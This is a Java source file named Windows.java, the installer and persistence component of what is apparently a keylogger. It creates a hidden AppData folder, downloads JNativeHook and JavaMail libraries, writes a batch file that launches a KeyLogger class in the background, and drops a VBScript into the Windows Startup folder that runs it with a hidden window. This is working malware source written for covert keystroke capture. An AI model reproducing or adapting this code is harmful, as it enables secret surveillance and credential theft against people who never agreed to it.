/*
 *  Windows.java
 *  
 *  @Authors: Niklas Adolfsson and Alexander Persson
 *  @Date: 2016-05-13
 *  
 *    - Creates a run.bat file in C:\Users\XXX\AppData\kl\:
 *      @echo off
 *      start "" /B java -cp "*.jar;*jar;" KeyLogger
 *    - Creates a kl.vbs file in C:\Users\XXX\AppData\Roaming\Microsoft\Start Menu\Program\Startup\
 *    - Downloads dependencies by creating a Download object
 *    - Finds absolute path to the JRE i.e.  .../bin/java.exe
 *  
 */

import java.io.File;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Arrays;
import java.util.List;



public class Windows 
{
	private String homedir;
	private String keyloggerDir;
	private String batFile;
	private String vbsFile = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kl.vbs";
	private String keyloggerJar;
	private String jnativeJar;
	private String jmailJar;
	private String mailJar;
	private String jrePath;
	private String homeDir;
	
    public Windows()
    {
      homeDir = System.getProperties().getProperty("user.home");
      keyloggerDir = homeDir + File.separator + "AppData" + File.separator + "kl";
      keyloggerJar = keyloggerDir + File.separator + "KeyLogger.jar";
      jnativeJar = keyloggerDir + File.separator + "jnativehook-2.0.3.jar";
      jmailJar = keyloggerDir + File.separator + "javax.mail.jar";
      mailJar = keyloggerDir + File.separator + "mail-1.4.7.jar";
      batFile = keyloggerDir + File.separator + "run.bat";
      vbsFile = homeDir + File.separator + vbsFile;
      jrePath = System.getProperties().getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
      
      File f = null;
      try 
      {
    	  f = new File(keyloggerDir);
    	  f.mkdir();
      }
      catch (Exception e) {
    	  e.printStackTrace();
      }
      
      Download obj = new Download(keyloggerDir);
      createBootScript();

    }
    
    public void createBootScript() 
    {
      List<String> batlines = Arrays.asList
      (
          "@echo off",
          "start " + "\"\" /B " + "\"" + jrePath + "\"" + " -cp " + "\"" + keyloggerJar + ";" + jnativeJar + ";" + jmailJar + ";" + mailJar + ";\"" + " KeyLogger"
      );
      List<String> vbsLines = Arrays.asList
      (
          "CreateObject(\"Wscript.Shell\").Run" + " \"" + batFile + "\", 0, True"
      );
      
      Charset utf8 = StandardCharsets.UTF_8;
      try
      {
        Files.write(Paths.get(batFile), batlines, utf8, StandardOpenOption.CREATE);
        Files.write(Paths.get(vbsFile), vbsLines, utf8, StandardOpenOption.CREATE);
      }
      catch (Exception e)
      {
        e.printStackTrace();
      }
    }
}
